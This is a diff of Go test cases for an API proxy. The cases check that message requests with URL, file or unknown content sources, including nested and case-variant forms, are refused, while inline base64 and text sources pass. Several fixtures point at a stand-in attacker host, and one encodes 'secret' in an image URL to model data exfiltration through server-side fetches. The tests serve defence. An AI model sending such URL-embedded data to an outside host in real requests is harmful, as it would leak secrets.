@@ -188,6 +188,19 @@ func TestRejectionsNeverReachUpstream(t *testing.T) {
 		{"duplicate key deep in messages", "POST", "/v1/messages", `{"model":"claude-opus-5-5","max_tokens":10,"messages":[{"role":"user","content":"hi","content":"bye"}]}`, nil, 400, "ambiguous_json"},
 		{"invalid utf-8", "POST", "/v1/messages", "{\"model\":\"claude-opus-5-5\",\"max_tokens\":10,\"tools\xff\":[]}", nil, 400, "ambiguous_json"},
 		{"ambiguous count_tokens", "POST", "/v1/messages/count_tokens", `{"model":"claude-fable-5-2","Model":"claude-opus-5-5"}`, nil, 400, "ambiguous_json"},
+		// Content sources: a url source makes the API fetch it from Anthropic's network.
+		{"url image", "POST", "/v1/messages", `{"model":"claude-opus-5-5","max_tokens":10,"messages":[{"role":"user","content":[{"type":"image","source":{"type":"url","url":"https://evil.example/x.png?d=secret"}}]}]}`, nil, 403, "source_not_allowed"},
+		{"url document", "POST", "/v1/messages", `{"model":"claude-opus-5-5","max_tokens":10,"messages":[{"role":"user","content":[{"type":"document","source":{"type":"url","url":"https://evil.example/a.pdf"}}]}]}`, nil, 403, "source_not_allowed"},
+		{"file source", "POST", "/v1/messages", `{"model":"claude-opus-5-5","max_tokens":10,"messages":[{"role":"user","content":[{"type":"image","source":{"type":"file","file_id":"file_1"}}]}]}`, nil, 403, "source_not_allowed"},
+		{"unknown source type", "POST", "/v1/messages", `{"model":"claude-opus-5-5","max_tokens":10,"messages":[{"role":"user","content":[{"type":"image","source":{"type":"s3","uri":"s3://b/k"}}]}]}`, nil, 403, "source_not_allowed"},
+		{"missing source type", "POST", "/v1/messages", `{"model":"claude-opus-5-5","max_tokens":10,"messages":[{"role":"user","content":[{"type":"image","source":{"url":"https://evil.example"}}]}]}`, nil, 403, "source_not_allowed"},
+		{"url image in tool_result", "POST", "/v1/messages", `{"model":"claude-opus-5-5","max_tokens":10,"messages":[{"role":"user","content":[{"type":"tool_result","tool_use_id":"t","content":[{"type":"image","source":{"type":"url","url":"https://evil.example"}}]}]}]}`, nil, 403, "source_not_allowed"},
+		{"url image in content document", "POST", "/v1/messages", `{"model":"claude-opus-5-5","max_tokens":10,"messages":[{"role":"user","content":[{"type":"document","source":{"type":"content","content":[{"type":"image","source":{"type":"url","url":"https://evil.example"}}]}}]}]}`, nil, 403, "source_not_allowed"},
+		{"url image in system", "POST", "/v1/messages", `{"model":"claude-opus-5-5","max_tokens":10,"system":[{"type":"image","source":{"type":"url","url":"https://evil.example"}}]}`, nil, 403, "source_not_allowed"},
+		{"case-variant source", "POST", "/v1/messages", `{"model":"claude-opus-5-5","max_tokens":10,"messages":[{"role":"user","content":[{"type":"image","Source":{"type":"url","url":"https://evil.example"}}]}]}`, nil, 403, "source_not_allowed"},
+		{"case-variant source type", "POST", "/v1/messages", `{"model":"claude-opus-5-5","max_tokens":10,"messages":[{"role":"user","content":[{"type":"image","source":{"type":"base64","TYPE":"url","url":"https://evil.example"}}]}]}`, nil, 403, "source_not_allowed"},
+		{"case-variant messages", "POST", "/v1/messages", `{"model":"claude-opus-5-5","max_tokens":10,"messages":[],"Messages":[{"role":"user","content":[{"type":"image","source":{"type":"url","url":"https://evil.example"}}]}]}`, nil, 400, "ambiguous_json"},
+		{"url image in count_tokens", "POST", "/v1/messages/count_tokens", `{"model":"claude-opus-5-5","messages":[{"role":"user","content":[{"type":"image","source":{"type":"url","url":"https://evil.example"}}]}]}`, nil, 403, "source_not_allowed"},
 	}
 	for _, tc := range cases {
 		t.Run(tc.name, func(t *testing.T) {
@@ -224,6 +237,13 @@ func TestAllowedRequestsPass(t *testing.T) {
 		// own schema may use any property names.
 		"schema property named Type": {"POST", "/v1/messages", `{"model":"claude-opus-5-5","max_tokens":10,"tools":[{"name":"t","input_schema":{"type":"object","properties":{"Type":{"type":"string"},"MODEL":{"type":"string"}}}}]}`},
 		"unicode text":               {"POST", "/v1/messages", `{"model":"claude-opus-5-5","max_tokens":10,"messages":[{"role":"user","content":"héllo ✓ \u00e9"}]}`},
+		// Inline sources pass; only fetched ones are refused.
+		"base64 image":        {"POST", "/v1/messages", `{"model":"claude-opus-5-5","max_tokens":10,"messages":[{"role":"user","content":[{"type":"image","source":{"type":"base64","media_type":"image/png","data":"iVBORw0KGgo="}},{"type":"text","text":"what is this?"}]}]}`},
+		"text document":       {"POST", "/v1/messages", `{"model":"claude-opus-5-5","max_tokens":10,"system":[{"type":"text","text":"be brief"}],"messages":[{"role":"user","content":[{"type":"document","source":{"type":"text","media_type":"text/plain","data":"hello"}}]}]}`},
+		"content document":    {"POST", "/v1/messages", `{"model":"claude-opus-5-5","max_tokens":10,"messages":[{"role":"user","content":[{"type":"document","source":{"type":"content","content":[{"type":"text","text":"a"},{"type":"image","source":{"type":"base64","media_type":"image/png","data":"iVBORw0KGgo="}}]}}]}]}`},
+		"search result label": {"POST", "/v1/messages", `{"model":"claude-opus-5-5","max_tokens":10,"messages":[{"role":"user","content":[{"type":"tool_result","tool_use_id":"t","content":[{"type":"search_result","source":"https://docs.example/a","title":"a","content":[{"type":"text","text":"x"}]}]}]}]}`},
+		// tool_use input is the model's own arguments, never fetched.
+		"url in tool_use input": {"POST", "/v1/messages", `{"model":"claude-opus-5-5","max_tokens":10,"messages":[{"role":"assistant","content":[{"type":"tool_use","id":"t","name":"x","input":{"source":{"type":"url","url":"https://x.example"}}}]}]}`},
 	} {
 		t.Run(name, func(t *testing.T) {
 			h := newHarness(t, jsonUpstream(`{"ok":true}`), nil)
